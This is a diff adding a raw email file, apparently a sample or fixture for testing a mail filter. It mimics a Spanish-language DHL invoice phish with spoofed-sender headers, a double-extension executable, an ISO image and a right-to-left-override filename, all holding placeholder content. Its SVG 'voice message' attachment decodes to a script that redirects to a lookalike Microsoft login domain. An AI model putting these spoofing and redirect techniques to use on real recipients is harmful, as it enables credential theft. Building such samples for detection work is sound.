@@ -1,0 +1,55 @@
+Authentication-Results: mx.empresa-demo.com.pa;
+       spf=softfail smtp.mailfrom=facturacion-dhl.net;
+       dkim=none;
+       dmarc=fail (p=REJECT) header.from=dhl.com
+From: DHL Express <noreply@dhl.com>
+To: bodega@empresa-demo.com.pa
+Subject: Factura de envío 7781 - mensaje de voz adjunto
+Date: Wed, 7 Oct 2026 07:45:00 -0500
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="XyZ"
+
+--XyZ
+Content-Type: text/plain; charset=utf-8
+
+Adjuntamos su factura y un mensaje de voz. Ábralo hoy, el pago vence hoy.
+--XyZ
+Content-Type: application/octet-stream; name="Factura_7781.pdf.exe"
+Content-Disposition: attachment; filename="Factura_7781.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQgTVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQgTVog
+ZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQgTVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQgTVogZmFr
+ZSBleGVjdXRhYmxlIGNvbnRlbnQgTVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQgTVogZmFrZSBl
+eGVjdXRhYmxlIGNvbnRlbnQgTVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQgTVogZmFrZSBleGVj
+dXRhYmxlIGNvbnRlbnQgTVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQgTVogZmFrZSBleGVjdXRh
+YmxlIGNvbnRlbnQgTVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQgTVogZmFrZSBleGVjdXRhYmxl
+IGNvbnRlbnQgTVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQgTVogZmFrZSBleGVjdXRhYmxlIGNv
+bnRlbnQgTVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQgTVogZmFrZSBleGVjdXRhYmxlIGNvbnRl
+bnQgTVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQgTVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQg
+TVogZmFrZSBleGVjdXRhYmxlIGNvbnRlbnQg
+--XyZ
+Content-Type: image/svg+xml; name="=?UTF-8?B?TWVuc2FqZSBkZSB2b3ogKDA6NDIpLnN2Zw==?="
+Content-Disposition: attachment
+Content-Transfer-Encoding: base64
+
+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+bG9jYXRpb249
+Imh0dHBzOi8vbG9naW4tbWljcm9zMGZ0LnRvcC9hIjwvc2NyaXB0Pjwvc3ZnPg==
+--XyZ
+Content-Type: application/x-iso9660-image
+Content-Disposition: attachment; filename*=utf-8''documentos%20env%C3%ADo.iso
+Content-Transfer-Encoding: base64
+
+Q0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0Qw
+MDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEg
+Q0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0Qw
+MDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEg
+Q0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0QwMDEgQ0Qw
+MDEgQ0QwMDEgQ0QwMDEg
+--XyZ
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="=?UTF-8?B?RmFjdHVyYV/igK5mZHAuZXhl?="
+Content-Transfer-Encoding: base64
+
+TVo=
+--XyZ--
